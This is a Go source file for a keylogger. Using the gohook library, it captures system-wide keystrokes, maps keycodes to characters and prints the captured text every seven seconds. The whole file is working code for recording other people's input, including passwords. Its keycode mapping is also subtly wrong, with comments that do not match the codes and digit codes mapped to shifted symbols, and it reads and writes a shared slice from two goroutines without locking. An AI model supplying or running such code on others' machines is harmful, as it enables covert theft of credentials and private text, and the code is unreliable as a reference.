package main

import (
    "fmt"
    "strings"
    "time"

    "github.com/robotn/gohook"
)

var keystrokes []string

func main() {
    // start event hook
    evChan := hook.Start()
    defer hook.End()

    go func() {
        for ev := range evChan {
            switch ev.Kind {
            case hook.KeyDown:
                // handle special keys as spaces
                switch ev.Keycode {
                case 8, 9, 13, 16, 17, 18, 32, 33, 34, 35, 36, 37, 38, 40, 45: // keycodes for backspace, tab, enter, space, pageup, pagedown, left, right, up, down, insert, delete, shift, ctrl, alt
                    keystrokes = append(keystrokes, " ")
                case 49: // '!'
                    keystrokes = append(keystrokes, "!")
                case 50: // '@'
                    keystrokes = append(keystrokes, "@")
                case 51: // '#'
                    keystrokes = append(keystrokes, "#")
                case 52: // '$'
                    keystrokes = append(keystrokes, "$")
                case 53: // '%'
                    keystrokes = append(keystrokes, "%")
                case 54: // '^'
                    keystrokes = append(keystrokes, "^")
                case 55: // '&'
                    keystrokes = append(keystrokes, "&")
                case 56: // '*'
                    keystrokes = append(keystrokes, "*")
                case 57: // '('
                    keystrokes = append(keystrokes, "(")
                case 48: // ')'
                    keystrokes = append(keystrokes, ")")
                case 61: // '='
                    keystrokes = append(keystrokes, "=")
                case 91: // '['
                    keystrokes = append(keystrokes, "[")
                case 93: // ']'
                    keystrokes = append(keystrokes, "]")
                case 92: // '\'
                    keystrokes = append(keystrokes, "\\")
                case 59: // ';'
                    keystrokes = append(keystrokes, ";")
                case 39: // '''
                    keystrokes = append(keystrokes, "'")
                case 44: // ','
                    keystrokes = append(keystrokes, ",")
                case 46: // '.'
                    keystrokes = append(keystrokes, ".")
                case 47: // '/'
                    keystrokes = append(keystrokes, "/")
                case 96: // '`'
                    keystrokes = append(keystrokes, "`")
                case 126: // '~'
                    keystrokes = append(keystrokes, "~")
                default:
                    // for printable characters
                    if ev.Keychar >= ' ' && ev.Keychar <= '~' {
                        keystrokes = append(keystrokes, string(ev.Keychar))
                    } else {
                        // for unknown special characters or non-printable keys, handle accordingly
                        keystrokes = append(keystrokes, " ") // Record other special keys as space
                    }
                }
            // exclude mouse events from being recorded
            case hook.MouseDown, hook.MouseUp, hook.MouseMove:
                continue
            }
        }
    }()

    ticker := time.NewTicker(7 * time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-ticker.C:
            fmt.Printf("Keystrokes pressed: %s\n", strings.Join(keystrokes, ""))
            keystrokes = nil // reset keystrokes slice after printing
        }
    }
}
